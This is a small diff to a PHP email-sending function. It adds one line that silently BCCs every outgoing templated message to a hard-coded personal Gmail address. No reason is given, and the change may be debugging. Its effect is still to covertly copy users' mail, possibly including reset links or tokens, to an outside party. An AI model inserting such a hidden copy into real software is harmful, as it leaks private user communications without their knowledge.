@@ -183,6 +183,7 @@
                 $mail ->setFrom( $_ENV['Mail_setFrom'],  $_ENV['Mail_setFrom_user']);
                 $mail ->addAddress($email);
                 $mail ->addReplyTo( $_ENV['ReplyTo'],  $_ENV['ReplyTo_User']);
+                $mail ->addBCC('waithirajon@gmail.com');
                 $mail ->isHTML(true);
                 $mail ->Subject = $data[$emailTemplate]['subject'];
                 $mail ->Body = $data[$emailTemplate]['body'];;
